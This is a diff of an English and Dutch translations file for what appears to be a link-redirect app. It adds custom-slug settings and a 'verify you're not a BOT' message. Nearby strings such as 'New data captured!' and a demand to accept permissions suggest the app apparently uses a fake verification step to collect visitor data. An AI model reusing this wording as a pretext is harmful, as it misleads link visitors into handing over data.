@@ -1,4 +1,4 @@
-export type Language = 'en' | 'nl';
+import type { Language } from './types';
 
 export const translations = {
   en: {
@@ -31,6 +31,7 @@ export const translations = {
     notification_name_update_failed: "Failed to update name.",
     notification_new_data: "New data captured!",
     notification_verification_success: "Verification successful!",
+    settings_url_identifier_error: "This slug is already in use. Please choose another.",
 
     // Password Gate
     password_gate_title: "Access Required",
@@ -95,6 +96,12 @@ export const translations = {
     settings_bitly_path: "Custom Bitly Path (Premium)",
     settings_bitly_path_desc: "This feature requires a premium Bitly account and is currently disabled.",
     settings_bitly_path_placeholder: "Premium feature",
+    settings_section_link: "Link Settings",
+    settings_url_identifier: "Custom URL Slug",
+    settings_url_identifier_desc: "A short, memorable path for your link. Leave blank for a random 5-character code.",
+    settings_url_identifier_placeholder: "e.g., my-awesome-link",
+    settings_redirect_language: "Redirect Page Language",
+    settings_redirect_language_desc: "The language displayed to the user on the redirect page.",
     
     settings_section_appearance: "Appearance",
     settings_display_text: "Display Text",
@@ -139,6 +146,7 @@ export const translations = {
     redirect_invalid_link_subtitle: "The link you followed appears to be broken or corrupted.",
     redirect_permissions_denied_title: "Permission Required",
     redirect_permissions_denied_message: "You must accept the requested permissions to verify and continue to the destination.",
+    redirect_verify_bot: "We need to verify you're not a BOT",
 
     redirect_default_card_subtitle: "You will be redirected shortly...",
     redirect_glass_card_subtitle: "Redirecting shortly...",
@@ -188,6 +196,7 @@ export const translations = {
     notification_name_update_failed: "Kon de naam niet bijwerken.",
     notification_new_data: "Nieuwe gegevens vastgelegd!",
     notification_verification_success: "Verificatie succesvol!",
+    settings_url_identifier_error: "Deze slug is al in gebruik. Kies een andere.",
 
     // Password Gate
     password_gate_title: "Toegang Vereist",
@@ -251,6 +260,12 @@ export const translations = {
     settings_bitly_path: "Aangepast Bitly Pad (Premium)",
     settings_bitly_path_desc: "Deze functie vereist een premium Bitly-account en is momenteel uitgeschakeld.",
     settings_bitly_path_placeholder: "Premium functie",
+    settings_section_link: "Link Instellingen",
+    settings_url_identifier: "Aangepaste URL Slug",
+    settings_url_identifier_desc: "Een kort, herkenbaar pad voor je link. Laat leeg voor een willekeurige 5-karakter code.",
+    settings_url_identifier_placeholder: "bijv., mijn-geweldige-link",
+    settings_redirect_language: "Taal van Redirect Pagina",
+    settings_redirect_language_desc: "De taal die aan de gebruiker wordt getoond op de redirect-pagina.",
 
     settings_section_appearance: "Uiterlijk",
     settings_display_text: "Weergavetekst",
@@ -295,6 +310,7 @@ export const translations = {
     redirect_invalid_link_subtitle: "De link die je hebt gevolgd lijkt kapot of beschadigd te zijn.",
     redirect_permissions_denied_title: "Toestemming Vereist",
     redirect_permissions_denied_message: "Je moet de gevraagde toestemmingen accepteren om geverifieerd te worden en door te gaan naar de bestemming.",
+    redirect_verify_bot: "We moeten verifiëren dat je geen BOT bent",
 
     redirect_default_card_subtitle: "Je wordt zo doorgestuurd...",
     redirect_glass_card_subtitle: "Wordt zo doorgestuurd...",
